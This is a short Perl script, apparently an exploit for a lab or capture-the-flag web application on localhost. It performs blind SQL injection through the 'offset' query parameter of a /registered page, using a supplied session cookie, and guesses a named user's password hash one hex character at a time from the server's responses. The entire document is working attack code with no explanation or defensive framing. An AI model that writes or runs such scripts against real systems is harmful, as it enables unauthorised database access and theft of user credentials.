#!/usr/bin/env perl

use strict;
use warnings;
use LWP::UserAgent;

die "Must provide sid and username" unless scalar @ARGV == 2;

my $url =
qq{http://127.0.0.1:3000/registered?offset=(select%201%20from%20users%20where%20nick='$ARGV[1]'%20and%20substr(password,%num%,1)%20=%20'%character%')};

my $agent = LWP::UserAgent->new;
$agent->default_header( Cookie => "sid=$ARGV[0]" );

my $more     = 1;
my $position = 0;
my @set      = qw( 0 1 2 3 4 5 6 7 8 9 a b c d e f );
my $password = '';

while ( $more and $position < 50 ) {
    $more = 0;
    $position++;

    for my $char (@set) {
        my $new_url = $url;
        $new_url =~ s/%character%/$char/;
        $new_url =~ s/%num%/$position/;

        my $res = $agent->get($new_url);

        if ( $res->is_success ) {
            $password .= $char;
            $more = 1;
            last;
        }
    }
}

print "hash is $password\n";
